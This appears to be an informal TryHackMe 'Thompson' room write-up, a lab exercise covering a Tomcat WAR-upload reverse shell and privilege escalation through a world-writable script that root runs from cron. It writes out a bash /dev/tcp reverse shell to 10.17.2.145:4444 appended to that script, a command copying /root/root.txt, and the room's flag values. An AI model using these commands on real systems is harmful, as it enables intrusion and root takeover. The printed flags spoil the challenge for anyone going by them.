# Report Thompson 
[![Header.png](./assets/Header.png)](https://tryhackme.com/r/room/bsidesgtthompson)
### NEW learning 
- msfpayload 
This is the feature of metasploit that is helpful to create a payload with the 
options set up. such as LHOSTS, LPORT etc.
We can create executables of different formates based on the target server. 


### Tomcat:
It is a webserver that is used to host java based websites.
This server there is somewhere an option to opload a war file.


once the exploit is uploaded, the we open the '/exploit' to connect to reverse shell
we get to see that there is an user called jack and has the user.txt

Once we had access to the reverse shell. we are now able to login using the tomcat
but we have the ssh open port lets see something is possible using ssh

### Into Jacks home
In the /home/jack, there are the files as listed below

```bash
ls -l
total 12
-rwxrwxrwx 1 jack jack 26 Aug 14  2019 id.sh
-rw-r--r-- 1 root root 39 Dec 26 09:22 test.txt
-rw-rw-r-- 1 jack jack 33 Aug 14  2019 user.txt
```
The id.sh is executing and putting the id output into the test.txt and in the same way we add the code.
 
```bash
echo "cp /root/root.txt /home/jack/root.txt" >> id.sh
```
### Now we execute the code 
Maybe jack has enough previlages to copy the file from the root is one reason since the file is hetting copied to the current directory after runnin `id.sh` in the terminal.
[CLARIFIED BELOW]
Now we can see the contents of the file.
Here are the contents:

```bash
ls
id.sh
root.txt
test.txt
user.txt


ls -l
total 16
-rwxrwxrwx 1 jack jack 64 Dec 26 09:32 id.sh
-rw-r--r-- 1 root root 33 Dec 26 09:48 root.txt
-rw-r--r-- 1 root root 39 Dec 26 09:48 test.txt
-rw-rw-r-- 1 jack jack 33 Aug 14  2019 user.txt


cat user.txt
39400c90bc683a41a8935e4719f181bf


cat root.txt
d89d5391984c0450a95497153ae7ca3a

```
### CLARIFICATION
Here is the clarification i have got after checking a writeup.
There is a linux tool software that automatically executes a command based on the frequence and the tool called `corntab`.
Here also the same scenirio has happened. The software is running in the background called as corntab and it executes everyminute the id.sh
Here is the cornpeas output log info
```bash
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *    * * *   root    cd /home/jack && bash id.sh

```
So we can clearly see that every minute the code id.sh in `/home/jack` will be executed by the root user.
we no need to execute it.
__Since the `corntab` is executing it using the root previlages, the `id` in the `test.txt` is root.__

- Now i will try to add a reverse shell bash script
```bash
$echo "bash -i >& /dev/tcp/10.17.2.145/4444 0>&1" >> id.sh

$cat id.sh
#!/bin/bash
id > test.txt
cp /root/root.txt /home/jack/root.txt
bash -i >& /dev/tcp/10.17.2.145/4444 0>&1

And i got the shell after a minute since it executes automatically
The screenshot in the same directory shows it.

```
You can use `linPEAS` to detect this. [PRovided you have access to ssh account]
```bash
scp -P 22 /path/to/linPEAS.sh username@IP:/path/to/dest/to/save/linPEAS.sh
```
This is helpless in this task unless we get access to the ssh credentials.
#### References 
[url]("https://bobloblaw321.wixsite.com/website/post/tryhackme-thompson")
